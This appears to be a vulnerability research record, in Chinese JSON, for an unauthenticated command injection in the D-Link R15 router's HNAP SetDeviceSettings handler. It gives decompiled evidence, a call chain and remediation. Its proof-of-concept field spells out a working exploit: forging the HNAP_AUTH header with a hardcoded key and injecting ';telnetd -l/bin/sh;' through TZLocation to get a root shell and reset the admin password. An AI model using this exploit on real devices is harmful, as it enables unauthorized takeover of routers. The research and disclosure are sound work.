@@ -1,0 +1,32 @@
+{
+  "job_id": "9160aafaa095",
+  "title": "D-Link R15 httpd HNAP SetDeviceSettings 未授权命令注入（TZLocation 拼入 fota 命令串）",
+  "severity": "critical",
+  "confidence": 0.7,
+  "vuln_class": "命令注入",
+  "cwe": "CWE-78",
+  "binary_md5": "b18be6d07f1c97903c063686924ed3c7",
+  "binary_path": "firmware/binwalk_extracted/firmware.extracted/0/decrypted.bin.extracted/56CD97/squashfs-root/bin/httpd",
+  "reachability": "static-only",
+  "summary": "httpd（80/tcp，HNAP/DHMAPI 协议）的 HNAP 动作 SetDeviceSettings 处理器 save_CSID_SetDeviceSettings 把请求参数 TZLocation 原样拼进 shell 命令串，经 libcsman 的 exec_cmd() 以 root 执行。TZLocation 在 sub_470D80 中仅被 snprintf(...,33,\"%s\") 拷贝，无任何字符过滤；处理器入口 sub_4716BC（SetDeviceSettings_put）不含任何会话/权限等级判断，而固件前端在“登录前”就用硬编码常量 withoutloginkey 签名调用该动作（首次配置向导设置管理员口令），因此未认证攻击者可直接注入命令。",
+  "evidence": [
+    "sub_470F24 @0x470f24 伪C：v18=(char*)(a1+172); exec_cmd(...,\"(fota -T %s; fota -I; fota -fQ) &\", v18);（汇编 0x471238-0x471260 证实 _exec_cmd 的格式串与实参为结构体+0xAC；同函数 0x471094 另有 system(\"openssl passwd -5 -in /tmp/iii > /tmp/ooo; rm /tmp/iii\")）",
+    "bin/httpd .rodata 0x4d0400-0x4d0600 实测字节含：'ws-hnap/SetDeviceSettings.c'、'(fota -T %s; fota -I; fota -fQ) &'、'openssl passwd -5 -in /tmp/iii > /tmp/ooo; rm /tmp/iii'、'24601'、'AdminPassword'、'ChangePassword'，证明命令串出厂即编译进固件",
+    "参数装配 sub_470D80 @0x470d80：a2[5]（=TZLocation，由 sub_4714DC 的 'TZLocation' 元素值直接赋值）经 snprintf(a3+172,33,\"%s\",v12) 写入，无白名单；sub_4714DC @0x4714dc 亦未校验",
+    "入口 sub_4716BC @0x4716bc 仅 sub_4714DC(a2,0,a3-1) 后设置 a1+272，全程无 session/authLevel 检查（对比同族 URL 处理器 sub_411FC8 @0x411fc8 会判定 a1[10]<4/7 并返回 401 'Page auth. is not enough'）",
+    "未登录可达性证据（www UI）：js/SOAP/SOAPAction.js 中 k=sessionStorage.getItem('PrivateKey')，为 null 时 k='withoutloginkey'，HNAP_AUTH=hex_hmac_md5(k, 时间戳+SOAPAction)；js/wizard/wizardModel.js 的 storeWizDeviceInfo/storeWizOnlyDevicePasswordDeviceInfo 在首次配置向导中调用 sendSOAPAction('SetDeviceSettings', i(0,t)) 并携带 AdminPassword、ChangePassword=true、TZLocation",
+    "同函数内第二条 shell 拼接：exec_cmd(...,\"event_notifier 3001 \\\"U=0&Y=261&I=0&D=%s\\\"&\", v26)，v26=sub_415DE4(DeviceName) 仅做 URL 编码（不转义双引号/空格/分号），但 DeviceName 先经 sub_416018→sub_415F98 黑名单（拒绝 &|\\\"`(){}$%;'\\\\）过滤，可达性低于 TZLocation 路径"
+  ],
+  "session_id": "s-mudoe515-e250",
+  "function_name": "save_CSID_SetDeviceSettings",
+  "preconditions": "httpd 监听 80/tcp（另据 SOAPAdministrationSettings 支持 RemoteMgt/RemoteMgtPort，可从 WAN 侧开放）；攻击者能向 /HNAP1/ 发送 POST 并自带 HNAP_AUTH 头（签名密钥为固件前端硬编码的 withoutloginkey，非机密）；请求体含 TZLocation 且长度≤32 字节，ChangePassword 为 true 或 TZLocation 非空即进入执行分支。httpd 以 root 运行，执行结果即 root 权限。",
+  "remediation": "不要用 shell 拼接执行系统命令：fota 调用改为 execve 参数数组或把时区写入 csman 后由守护进程读取；对 TZLocation/DeviceName 做严格白名单（仅允许 IANA 时区字符集）并做 shell 转义；HNAP SetDeviceSettings 必须在处理器内校验会话/权限等级（与 sub_411FC8 的 authLevel 判定一致），仅在设备未完成初始配置时放行；移除前端硬编码 withoutloginkey 预登录签名密钥。",
+  "poc": "1) 取秒级时间戳 T，令 ACTION=\"http://purenetworks.com/HNAP1/SetDeviceSettings\"，HNAP_AUTH = uppercase(hex_hmac_md5(\"withoutloginkey\", T + '\"' + ACTION + '\"')) + \" \" + T；2) 发送：POST /HNAP1/ HTTP/1.1 | Host: <router> | Content-Type: text/xml; charset=utf-8 | SOAPACTION: \"http://purenetworks.com/HNAP1/SetDeviceSettings\" | HNAP_AUTH: <上一步结果> | Content-Length: N | 空行 | <?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><SetDeviceSettings xmlns=\"http://purenetworks.com/HNAP1/\"><DeviceName>R15</DeviceName><AdminPassword>P@ssw0rd123</AdminPassword><ChangePassword>true</ChangePassword><TZLocation>;telnetd -l/bin/sh;</TZLocation></SetDeviceSettings></soap:Body></soap:Envelope>；3) 因 snprintf 限长 33 字节，TZLocation 用 20 字节的 \";telnetd -l/bin/sh;\"，httpd 以 root 后台执行 (fota -T ;telnetd -l/bin/sh;; fota -I; fota -fQ) & ，即获得未授权 root shell（该请求同时把管理员口令改为 P@ssw0rd123，写入 csman 0x10002）。",
+  "call_chain": "HTTP POST /HNAP1/ (SOAPAction: http://purenetworks.com/HNAP1/SetDeviceSettings) → sub_4716BC@0x4716bc (SetDeviceSettings_put) → sub_4714DC@0x4714dc (解析 DeviceName/AdminPassword/ChangePassword/TZLocation) → sub_470D80@0x470d80 (TZLocation→结构体+0xAC) → sub_470F24@0x470f24 (save_CSID_SetDeviceSettings) → _exec_cmd@0x471260 (\"(fota -T %s; fota -I; fota -fQ) &\") → libcsman.so exec_cmd → commander → system()（root）",
+  "function_addr": "0x470f24",
+  "id": "F-mudp2pni-0d29",
+  "status": "draft",
+  "owner": "token-admin",
+  "recorded_at": "2026-09-23T06:00:57Z",
+  "history": []
+}
